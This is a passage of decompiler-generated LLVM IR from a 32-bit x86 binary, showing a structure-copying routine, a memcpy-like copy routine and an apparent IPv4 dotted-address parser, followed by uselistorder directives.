  %v0_80552c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80552c6, i32* %stack_var_-8, align 4
  %v4_80552ca = ptrtoint i16* %arg1 to i32
  store i32 %v4_80552ca, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_80552d7 = inttoptr i32 %arg2 to i8*
  %v4_80552d7 = call i32 @function_805314a(i8* %v3_80552d7, i32 0, i32 88)
  store i32 %v4_80552d7, i32* %eax.global-to-local, align 4
  %v2_80552dc = load i16, i16* %arg1, align 2
  %v3_80552dc = zext i16 %v2_80552dc to i32
  store i32 %v3_80552dc, i32* %eax.global-to-local, align 4
  %v0_80552df = load i32, i32* %ebx.global-to-local, align 4
  %v1_80552df = add i32 %v0_80552df, 4
  %v2_80552df = inttoptr i32 %v1_80552df to i32*
  store i32 0, i32* %v2_80552df, align 4
  %v0_80552e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80552e6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552e6 = inttoptr i32 %v1_80552e6 to i32*
  store i32 %v0_80552e6, i32* %v2_80552e6, align 4
  %v0_80552e8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552e8 = add i32 %v0_80552e8, 4
  %v2_80552e8 = inttoptr i32 %v1_80552e8 to i32*
  %v3_80552e8 = load i32, i32* %v2_80552e8, align 4
  store i32 %v3_80552e8, i32* %eax.global-to-local, align 4
  %v1_80552eb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552eb = add i32 %v1_80552eb, 12
  %v3_80552eb = inttoptr i32 %v2_80552eb to i32*
  store i32 %v3_80552e8, i32* %v3_80552eb, align 4
  %v0_80552ee = load i32, i32* %esi.global-to-local, align 4
  %v1_80552ee = add i32 %v0_80552ee, 8
  %v2_80552ee = inttoptr i32 %v1_80552ee to i16*
  %v3_80552ee = load i16, i16* %v2_80552ee, align 2
  %v4_80552ee = zext i16 %v3_80552ee to i32
  store i32 %v4_80552ee, i32* %eax.global-to-local, align 4
  %v1_80552f2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552f2 = add i32 %v1_80552f2, 16
  %v3_80552f2 = inttoptr i32 %v2_80552f2 to i32*
  store i32 %v4_80552ee, i32* %v3_80552f2, align 4
  %v0_80552f5 = load i32, i32* %esi.global-to-local, align 4
  %v1_80552f5 = add i32 %v0_80552f5, 10
  %v2_80552f5 = inttoptr i32 %v1_80552f5 to i16*
  %v3_80552f5 = load i16, i16* %v2_80552f5, align 2
  %v4_80552f5 = zext i16 %v3_80552f5 to i32
  store i32 %v4_80552f5, i32* %eax.global-to-local, align 4
  %v1_80552f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80552f9 = add i32 %v1_80552f9, 20
  %v3_80552f9 = inttoptr i32 %v2_80552f9 to i32*
  store i32 %v4_80552f5, i32* %v3_80552f9, align 4
  %v0_80552fc = load i32, i32* %esi.global-to-local, align 4
  %v1_80552fc = add i32 %v0_80552fc, 12
  %v2_80552fc = inttoptr i32 %v1_80552fc to i16*
  %v3_80552fc = load i16, i16* %v2_80552fc, align 2
  %v4_80552fc = zext i16 %v3_80552fc to i32
  store i32 %v4_80552fc, i32* %eax.global-to-local, align 4
  %v1_8055300 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055300 = add i32 %v1_8055300, 24
  %v3_8055300 = inttoptr i32 %v2_8055300 to i32*
  store i32 %v4_80552fc, i32* %v3_8055300, align 4
  %v0_8055303 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055303 = add i32 %v0_8055303, 14
  %v2_8055303 = inttoptr i32 %v1_8055303 to i16*
  %v3_8055303 = load i16, i16* %v2_8055303, align 2
  %v4_8055303 = zext i16 %v3_8055303 to i32
  store i32 %v4_8055303, i32* %eax.global-to-local, align 4
  %v1_8055307 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055307 = add i32 %v1_8055307, 28
  %v3_8055307 = inttoptr i32 %v2_8055307 to i32*
  store i32 %v4_8055303, i32* %v3_8055307, align 4
  %v0_805530a = load i32, i32* %esi.global-to-local, align 4
  %v1_805530a = add i32 %v0_805530a, 16
  %v2_805530a = inttoptr i32 %v1_805530a to i16*
  %v3_805530a = load i16, i16* %v2_805530a, align 2
  %v4_805530a = zext i16 %v3_805530a to i32
  store i32 %v4_805530a, i32* %eax.global-to-local, align 4
  %v0_805530e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805530e = add i32 %v0_805530e, 36
  %v2_805530e = inttoptr i32 %v1_805530e to i32*
  store i32 0, i32* %v2_805530e, align 4
  %v0_8055315 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055315 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055315 = add i32 %v1_8055315, 32
  %v3_8055315 = inttoptr i32 %v2_8055315 to i32*
  store i32 %v0_8055315, i32* %v3_8055315, align 4
  %v0_8055318 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055318 = add i32 %v0_8055318, 20
  %v2_8055318 = inttoptr i32 %v1_8055318 to i32*
  %v3_8055318 = load i32, i32* %v2_8055318, align 4
  store i32 %v3_8055318, i32* %eax.global-to-local, align 4
  %v1_805531b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805531b = add i32 %v1_805531b, 44
  %v3_805531b = inttoptr i32 %v2_805531b to i32*
  store i32 %v3_8055318, i32* %v3_805531b, align 4
  %v0_805531e = load i32, i32* %esi.global-to-local, align 4
  %v1_805531e = add i32 %v0_805531e, 24
  %v2_805531e = inttoptr i32 %v1_805531e to i32*
  %v3_805531e = load i32, i32* %v2_805531e, align 4
  store i32 %v3_805531e, i32* %eax.global-to-local, align 4
  %v1_8055321 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055321 = add i32 %v1_8055321, 48
  %v3_8055321 = inttoptr i32 %v2_8055321 to i32*
  store i32 %v3_805531e, i32* %v3_8055321, align 4
  %v0_8055324 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055324 = add i32 %v0_8055324, 28
  %v2_8055324 = inttoptr i32 %v1_8055324 to i32*
  %v3_8055324 = load i32, i32* %v2_8055324, align 4
  store i32 %v3_8055324, i32* %eax.global-to-local, align 4
  %v1_8055327 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055327 = add i32 %v1_8055327, 52
  %v3_8055327 = inttoptr i32 %v2_8055327 to i32*
  store i32 %v3_8055324, i32* %v3_8055327, align 4
  %v0_805532a = load i32, i32* %esi.global-to-local, align 4
  %v1_805532a = add i32 %v0_805532a, 32
  %v2_805532a = inttoptr i32 %v1_805532a to i32*
  %v3_805532a = load i32, i32* %v2_805532a, align 4
  store i32 %v3_805532a, i32* %eax.global-to-local, align 4
  %v1_805532d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805532d = add i32 %v1_805532d, 56
  %v3_805532d = inttoptr i32 %v2_805532d to i32*
  store i32 %v3_805532a, i32* %v3_805532d, align 4
  %v0_8055330 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055330 = add i32 %v0_8055330, 40
  %v2_8055330 = inttoptr i32 %v1_8055330 to i32*
  %v3_8055330 = load i32, i32* %v2_8055330, align 4
  store i32 %v3_8055330, i32* %eax.global-to-local, align 4
  %v1_8055333 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055333 = add i32 %v1_8055333, 64
  %v3_8055333 = inttoptr i32 %v2_8055333 to i32*
  store i32 %v3_8055330, i32* %v3_8055333, align 4
  %v0_8055336 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055336 = add i32 %v0_8055336, 48
  %v2_8055336 = inttoptr i32 %v1_8055336 to i32*
  %v3_8055336 = load i32, i32* %v2_8055336, align 4
  store i32 %v3_8055336, i32* %eax.global-to-local, align 4
  %v1_8055339 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055339 = add i32 %v1_8055339, 72
  %v3_8055339 = inttoptr i32 %v2_8055339 to i32*
  store i32 %v3_8055336, i32* %v3_8055339, align 4
  %v2_805533f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805533f, i32* @ebx, align 4
  ret i32 %v3_8055336

; uselistorder directives
  uselistorder i32 72, { 4, 3, 5, 0, 6, 7, 8, 1, 9, 10, 11, 12, 2 }
  uselistorder i32 64, { 11, 10, 6, 5, 0, 1, 7, 2, 12, 13, 4, 8, 3, 9 }
  uselistorder i32 40, { 10, 5, 11, 6, 0, 7, 8, 9, 1, 3, 12, 2, 13, 14, 15, 16, 4 }
  uselistorder i32 56, { 9, 8, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 6, 15, 16, 17, 7 }
  uselistorder i32 52, { 6, 5, 8, 9, 2, 3, 0, 7, 4, 1 }
  uselistorder i32 48, { 14, 15, 12, 7, 11, 1, 6, 8, 2, 3, 9, 0, 10, 13, 4, 16, 17, 18, 19, 20, 5 }
  uselistorder i32 32, { 58, 59, 63, 37, 48, 64, 65, 60, 34, 52, 53, 66, 1, 0, 2, 3, 43, 4, 5, 6, 7, 8, 38, 67, 39, 44, 45, 49, 46, 47, 35, 10, 9, 12, 11, 13, 14, 41, 40, 50, 51, 54, 55, 15, 56, 17, 16, 42, 57, 61, 36, 62, 68, 18, 19, 20, 21, 69, 22, 23, 70, 71, 25, 24, 27, 26, 28, 29, 72, 30, 31, 73, 74, 75, 32, 33, 76 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 46, 47, 18, 44, 45, 54, 48, 49, 50, 7, 8, 0, 1, 14, 35, 31, 9, 12, 19, 13, 20, 21, 10, 37, 32, 22, 11, 23, 36, 24, 25, 26, 27, 28, 29, 30, 33, 34, 38, 39, 40, 43, 42, 41, 15, 2, 51, 52, 53, 5, 16, 4, 3, 55, 17, 6 }
  uselistorder i32 20, { 28, 29, 10, 18, 26, 27, 41, 30, 31, 32, 33, 0, 1, 17, 12, 15, 16, 13, 19, 14, 20, 21, 22, 23, 24, 25, 2, 3, 34, 35, 36, 4, 5, 37, 38, 39, 42, 40, 9, 7, 8, 6, 43, 44, 45, 11 }
  uselistorder i32 16, { 81, 82, 83, 84, 85, 86, 87, 88, 20, 53, 3, 89, 34, 117, 4, 68, 69, 70, 0, 5, 118, 119, 7, 6, 120, 1, 8, 90, 91, 21, 35, 52, 28, 36, 29, 37, 11, 12, 45, 54, 55, 10, 61, 40, 43, 44, 41, 57, 42, 46, 56, 47, 13, 39, 38, 58, 59, 60, 62, 63, 64, 48, 65, 30, 66, 22, 71, 72, 73, 74, 75, 76, 77, 78, 79, 31, 14, 80, 23, 24, 32, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 50, 107, 25, 26, 27, 108, 109, 110, 111, 112, 9, 33, 67, 113, 114, 115, 121, 116, 122, 126, 16, 127, 128, 129, 130, 131, 132, 133, 123, 124, 125, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 2, 144, 145, 146, 147, 148, 149, 150, 151, 19, 152, 17, 18, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 15, 175, 51, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 49 }
  uselistorder i32 8, { 115, 116, 117, 118, 119, 120, 121, 122, 123, 54, 129, 55, 130, 56, 94, 11, 132, 133, 134, 135, 136, 137, 138, 4, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 5, 103, 104, 105, 106, 107, 108, 109, 110, 149, 150, 151, 152, 153, 154, 63, 6, 64, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 62, 172, 173, 8, 174, 175, 176, 177, 9, 178, 124, 125, 126, 127, 131, 58, 65, 59, 66, 60, 67, 179, 180, 181, 68, 98, 97, 12, 95, 99, 100, 101, 13, 102, 111, 112, 113, 114, 14, 15, 16, 17, 18, 10, 69, 0, 19, 20, 128, 70, 71, 21, 72, 73, 22, 23, 74, 24, 1, 2, 182, 51, 183, 29, 30, 28, 35, 184, 27, 33, 34, 75, 61, 76, 77, 31, 78, 32, 79, 3, 25, 52, 185, 36, 80, 37, 81, 38, 39, 40, 41, 82, 42, 43, 44, 83, 45, 84, 186, 85, 46, 86, 47, 87, 187, 88, 48, 89, 49, 90, 91, 92, 50, 26, 188, 53, 189, 93, 96, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_805314a, { 7, 4, 5, 6, 0, 1, 2, 3, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_8055342(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8055342:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8055343 = load i32, i32* @esi, align 4
  store i32 %v0_8055343, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8055344 = sdiv i32 %sext, 16777216
  store i32 %v4_8055344, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805534e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805534e, i32* %edi.global-to-local, align 4
  %v2_8055352 = udiv i32 %v4_8055344, 4
  %v3_8055355 = inttoptr i32 %arg2 to i8*
  %v4_8055355 = bitcast i16* %arg1 to i8*
  %v5_8055355 = call i8* @_memcpy(i8* %v4_8055355, i8* %v3_8055355, i32 %v2_8055352)
  %v0_8055357 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055357 = and i32 %v0_8055357, 2
  %v3_8055357 = icmp eq i32 %v2_8055357, 0
  br i1 %v3_8055357, label %dec_label_pc_805535d, label %dec_label_pc_805535b

dec_label_pc_805535b:                             ; preds = %dec_label_pc_8055342
  %v0_805535b = load i32, i32* %esi.global-to-local, align 4
  %v1_805535b = inttoptr i32 %v0_805535b to i16*
  %v2_805535b = load i16, i16* %v1_805535b, align 2
  %v3_805535b = load i32, i32* %edi.global-to-local, align 4
  %v4_805535b = inttoptr i32 %v3_805535b to i16*
  store i16 %v2_805535b, i16* %v4_805535b, align 2
  %v5_805535b = load i32, i32* %edi.global-to-local, align 4
  %v6_805535b = load i32, i32* %esi.global-to-local, align 4
  %v7_805535b = load i1, i1* @df, align 1
  %v8_805535b = select i1 %v7_805535b, i32 -2, i32 2
  %v9_805535b = add i32 %v8_805535b, %v5_805535b
  %v10_805535b = add i32 %v8_805535b, %v6_805535b
  store i32 %v9_805535b, i32* %edi.global-to-local, align 4
  store i32 %v10_805535b, i32* %esi.global-to-local, align 4
  %v0_805535d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805535d

dec_label_pc_805535d:                             ; preds = %dec_label_pc_8055342, %dec_label_pc_805535b
  %v0_805535d = phi i32 [ %v0_8055357, %dec_label_pc_8055342 ], [ %v0_805535d.pre, %dec_label_pc_805535b ]
  %v2_805535d = urem i32 %v0_805535d, 2
  %v3_805535d = icmp eq i32 %v2_805535d, 0
  br i1 %v3_805535d, label %dec_label_pc_8055362, label %dec_label_pc_8055361

dec_label_pc_8055361:                             ; preds = %dec_label_pc_805535d
  %v0_8055361 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055361 = inttoptr i32 %v0_8055361 to i8*
  %v2_8055361 = load i8, i8* %v1_8055361, align 1
  %v3_8055361 = load i32, i32* %edi.global-to-local, align 4
  %v4_8055361 = inttoptr i32 %v3_8055361 to i8*
  store i8 %v2_8055361, i8* %v4_8055361, align 1
  %v5_8055361 = load i32, i32* %edi.global-to-local, align 4
  %v6_8055361 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055361 = load i1, i1* @df, align 1
  %v8_8055361 = select i1 %v7_8055361, i32 -1, i32 1
  %v9_8055361 = add i32 %v8_8055361, %v5_8055361
  %v10_8055361 = add i32 %v8_8055361, %v6_8055361
  store i32 %v9_8055361, i32* %edi.global-to-local, align 4
  store i32 %v10_8055361, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055362

dec_label_pc_8055362:                             ; preds = %dec_label_pc_805535d, %dec_label_pc_8055361
  store i32 %v4_805534e, i32* %eax.global-to-local, align 4
  %v2_8055366 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055366, i32* @esi, align 4
  ret i32 %v4_805534e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 4, 7, 8, 5, 3, 2, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* @df, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 4, { 2, 180, 181, 182, 183, 184, 185, 235, 236, 238, 239, 240, 241, 242, 237, 56, 94, 243, 245, 246, 248, 251, 252, 253, 254, 255, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 249, 250, 159, 59, 160, 161, 162, 163, 164, 165, 166, 4, 168, 167, 265, 5, 266, 58, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 9, 287, 288, 290, 289, 6, 247, 244, 98, 63, 186, 187, 188, 189, 190, 60, 64, 291, 292, 65, 105, 106, 66, 107, 108, 109, 132, 133, 134, 137, 138, 139, 140, 141, 142, 129, 130, 110, 111, 143, 144, 145, 119, 120, 121, 99, 100, 101, 116, 117, 118, 122, 123, 124, 125, 126, 127, 146, 147, 102, 103, 104, 112, 113, 114, 115, 13, 128, 131, 95, 148, 156, 157, 158, 149, 135, 136, 61, 155, 14, 150, 62, 151, 152, 153, 154, 169, 170, 171, 96, 172, 173, 15, 174, 175, 176, 16, 17, 18, 19, 177, 67, 68, 178, 179, 69, 57, 191, 0, 192, 193, 194, 195, 196, 197, 20, 21, 198, 70, 199, 71, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 22, 72, 73, 212, 213, 214, 215, 216, 217, 218, 23, 219, 220, 221, 222, 24, 74, 223, 224, 225, 226, 25, 293, 294, 227, 228, 229, 230, 231, 232, 233, 234, 8, 295, 296, 297, 52, 30, 31, 29, 36, 28, 34, 35, 298, 299, 300, 10, 75, 76, 77, 32, 78, 33, 79, 1, 301, 26, 302, 53, 11, 303, 37, 80, 38, 81, 39, 304, 40, 41, 42, 82, 43, 44, 45, 83, 46, 84, 85, 47, 86, 48, 87, 305, 88, 49, 89, 50, 90, 306, 91, 92, 307, 51, 308, 309, 310, 311, 313, 312, 314, 315, 316, 317, 318, 319, 320, 321, 322, 27, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 54, 12, 7, 350, 55, 93, 351, 97 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* @esi, { 122, 123, 38, 39, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 78, 79, 124, 125, 13, 126, 127, 128, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 129, 130, 131, 145, 149, 3, 150, 151, 152, 153, 154, 155, 156, 146, 147, 148, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 157, 158, 159, 160, 161, 162, 163, 0, 164, 165, 166, 167, 4, 168, 10, 169, 170, 171, 172, 173, 174, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 143, 144, 175, 176, 14, 17, 18, 19, 29, 30, 25, 31, 23, 15, 22, 24, 32, 26, 16, 20, 21, 27, 28, 33, 34, 35, 36, 37, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 111, 1, 113, 114, 115, 116, 11, 117, 177, 178, 179, 118, 119, 120, 9, 180, 181, 121, 182, 183, 6, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 7, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 12, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 8, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 284, 281, 282, 283, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305 }
  uselistorder label %dec_label_pc_8055362, { 1, 0 }
  uselistorder label %dec_label_pc_805535d, { 1, 0 }
}

define i32 @function_8055369(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8055369:
  %v1_8055374 = icmp eq i8* %arg1, null
  br i1 %v1_8055374, label %dec_label_pc_80553f5, label %dec_label_pc_8055378

dec_label_pc_8055378:                             ; preds = %dec_label_pc_8055369
  %v4_8055370 = ptrtoint i8* %arg1 to i32
  %v0_8055386.pre = load i32, i32* bitcast (i32** @global_var_805722c.229 to i32*), align 4
  br label %dec_label_pc_8055383

dec_label_pc_8055383:                             ; preds = %dec_label_pc_8055378, %dec_label_pc_80553cc
  %v0_80553cc = phi i32 [ 0, %dec_label_pc_8055378 ], [ %v2_80553d2, %dec_label_pc_80553cc ]
  %v2_80553cf = phi i32 [ 1, %dec_label_pc_8055378 ], [ %v3_80553cf, %dec_label_pc_80553cc ]
  %v0_8055383 = phi i32 [ %v4_8055370, %dec_label_pc_8055378 ], [ %v0_80553833, %dec_label_pc_80553cc ]
  %v1_8055383 = inttoptr i32 %v0_8055383 to i8*
  %v2_8055383 = load i8, i8* %v1_8055383, align 1
  %v3_8055383 = sext i8 %v2_8055383 to i32
  %v2_805538c = mul nsw i32 %v3_8055383, 2
  %v3_805538c = add i32 %v2_805538c, %v0_8055386.pre
  %v4_805538c = inttoptr i32 %v3_805538c to i8*
  %v5_805538c = load i8, i8* %v4_805538c, align 1
  %v6_805538c = and i8 %v5_805538c, 8
  %v7_805538c = icmp eq i8 %v6_805538c, 0
  br i1 %v7_805538c, label %dec_label_pc_80553f5, label %dec_label_pc_8055393

dec_label_pc_8055393:                             ; preds = %dec_label_pc_8055383
  %v4_80553a7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80553a7

dec_label_pc_8055397:                             ; preds = %dec_label_pc_80553a7
  %v3_8055397 = mul i32 %v1_8055397, 10
  %v2_805539a = add i32 %v3_8055397, -48
  %v3_805539a = add i32 %v2_805539a, %v2_80553a9
  %v1_805539e = add i32 %v3_805539a, -255
  %v6_805539e = sub i32 254, %v3_805539a
  %v7_805539e = and i32 %v6_805539e, %v3_805539a
  %v8_805539e = icmp slt i32 %v7_805539e, 0
  %v9_805539e = icmp eq i32 %v1_805539e, 0
  %v10_805539e = icmp slt i32 %v1_805539e, 0
  %v3_80553a4 = icmp eq i1 %v10_805539e, %v8_805539e
  %v4_80553a4 = icmp eq i1 %v9_805539e, false
  %v5_80553a4 = and i1 %v4_80553a4, %v3_80553a4
  br i1 %v5_80553a4, label %dec_label_pc_80553f5, label %dec_label_pc_80553a6

dec_label_pc_80553a6:                             ; preds = %dec_label_pc_8055397
  %v1_80553a6 = add i32 %v0_80553a6, 1
  br label %dec_label_pc_80553a7

dec_label_pc_80553a7:                             ; preds = %dec_label_pc_8055393, %dec_label_pc_80553a6
  %v1_8055397 = phi i32 [ 0, %dec_label_pc_8055393 ], [ %v3_805539a, %dec_label_pc_80553a6 ]
  %v4_80553a7 = phi i32 [ %v4_80553a7.pre, %dec_label_pc_8055393 ], [ %v6_80553a7, %dec_label_pc_80553a6 ]
  %v0_80553a6 = phi i32 [ %v0_8055383, %dec_label_pc_8055393 ], [ %v1_80553a6, %dec_label_pc_80553a6 ]
  %v1_80553a7 = inttoptr i32 %v0_80553a6 to i8*
  %v2_80553a7 = load i8, i8* %v1_80553a7, align 1
  %v3_80553a7 = zext i8 %v2_80553a7 to i32
  %v5_80553a7 = and i32 %v4_80553a7, -256
  %v6_80553a7 = or i32 %v3_80553a7, %v5_80553a7
  store i32 %v6_80553a7, i32* @edx, align 4
  %v2_80553a9 = sext i8 %v2_80553a7 to i32
  %v2_80553ac = mul nsw i32 %v2_80553a9, 2
  %v3_80553ac = add i32 %v2_80553ac, %v0_8055386.pre
  %v4_80553ac = inttoptr i32 %v3_80553ac to i16*
  %v5_80553ac = load i16, i16* %v4_80553ac, align 2
  %v2_80553b1 = and i16 %v5_80553ac, 8
  %v3_80553b1 = icmp eq i16 %v2_80553b1, 0
  %v1_80553b3 = icmp eq i1 %v3_80553b1, false
  br i1 %v1_80553b3, label %dec_label_pc_8055397, label %dec_label_pc_80553b5

dec_label_pc_80553b5:                             ; preds = %dec_label_pc_80553a7
  %v8_80553b5 = sub nsw i32 2, %v2_80553cf
  %v9_80553b5 = and i32 %v8_80553b5, %v2_80553cf
  %v10_80553b5 = icmp slt i32 %v9_80553b5, 0
  %v11_80553b5 = icmp eq i32 %v2_80553cf, 3
  %v12_80553b5 = icmp slt i32 %v2_80553cf, 3
  %v3_80553b9 = icmp eq i1 %v12_80553b5, %v10_80553b5
  %v4_80553b9 = icmp eq i1 %v11_80553b5, false
  %v5_80553b9 = and i1 %v4_80553b9, %v3_80553b9
  br i1 %v5_80553b9, label %dec_label_pc_80553c3, label %dec_label_pc_80553bb

dec_label_pc_80553bb:                             ; preds = %dec_label_pc_80553b5
  %v10_80553bb = icmp eq i8 %v2_80553a7, 46
  %v1_80553be = icmp eq i1 %v10_80553bb, false
  br i1 %v1_80553be, label %dec_label_pc_80553f5, label %dec_label_pc_80553c0

dec_label_pc_80553c0:                             ; preds = %dec_label_pc_80553bb
  %v1_80553c0 = add i32 %v0_80553a6, 1
  br label %dec_label_pc_80553cc

dec_label_pc_80553c3:                             ; preds = %dec_label_pc_80553b5
  %v1_80553c3 = add i32 %v0_80553a6, 1
  %v4_80553c4 = icmp eq i8 %v2_80553a7, 0
  br i1 %v4_80553c4, label %dec_label_pc_80553cc, label %dec_label_pc_80553c8

dec_label_pc_80553c8:                             ; preds = %dec_label_pc_80553c3
  %v2_80553c8 = and i16 %v5_80553ac, 32
  %v3_80553c8 = icmp eq i16 %v2_80553c8, 0
  br i1 %v3_80553c8, label %dec_label_pc_80553f5, label %dec_label_pc_80553cc

dec_label_pc_80553cc:                             ; preds = %dec_label_pc_80553c8, %dec_label_pc_80553c3, %dec_label_pc_80553c0
  %v0_80553833 = phi i32 [ %v1_80553c3, %dec_label_pc_80553c8 ], [ %v1_80553c3, %dec_label_pc_80553c3 ], [ %v1_80553c0, %dec_label_pc_80553c0 ]
  %v2_80553cc = mul i32 %v0_80553cc, 256
  %v3_80553cf = add nuw nsw i32 %v2_80553cf, 1
  %v2_80553d2 = or i32 %v1_8055397, %v2_80553cc
  %v7_80553d8 = icmp sgt i32 %v2_80553cf, 3
  br i1 %v7_80553d8, label %dec_label_pc_80553da, label %dec_label_pc_8055383

dec_label_pc_80553da:                             ; preds = %dec_label_pc_80553cc
  %v4_80553df = icmp eq i32 %arg2, 0
  br i1 %v4_80553df, label %dec_label_pc_80553f7, label %dec_label_pc_80553e6

dec_label_pc_80553e6:                             ; preds = %dec_label_pc_80553da
  %v1_80553ea = call i32 @llvm.bswap.i32(i32 %v2_80553d2)
  %v2_80553ec = inttoptr i32 %arg2 to i32*
  store i32 %v1_80553ea, i32* %v2_80553ec, align 4
  br label %dec_label_pc_80553f7

dec_label_pc_80553f5:                             ; preds = %dec_label_pc_80553c8, %dec_label_pc_80553bb, %dec_label_pc_8055383, %dec_label_pc_8055397, %dec_label_pc_8055369
  br label %dec_label_pc_80553f7

dec_label_pc_80553f7:                             ; preds = %dec_label_pc_80553da, %dec_label_pc_80553e6, %dec_label_pc_80553f5
  %v0_80553fc = phi i32 [ 1, %dec_label_pc_80553da ], [ 1, %dec_label_pc_80553e6 ], [ 0, %dec_label_pc_80553f5 ]
  ret i32 %v0_80553fc

; uselistorder directives
  uselistorder i32 %v2_80553a9, { 1, 0 }
  uselistorder i32 %v6_80553a7, { 1, 0 }
  uselistorder i8 %v2_80553a7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80553a6, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805539e, { 1, 0 }
  uselistorder i32 %v3_805539a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80553cf, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 23, 27, 24, 2, 3, 4, 5, 0, 6, 7, 28, 21, 8, 9, 11, 10, 22, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26 }
  uselistorder i32 3, { 1, 2, 0, 29, 15, 32, 6, 7, 11, 3, 8, 12, 4, 20, 21, 22, 23, 24, 25, 26, 16, 9, 27, 28, 13, 14, 10, 30, 31, 5, 33, 18, 19, 34, 17 }
  uselistorder i16 0, { 0, 1, 7, 8, 4, 5, 6, 2, 3 }
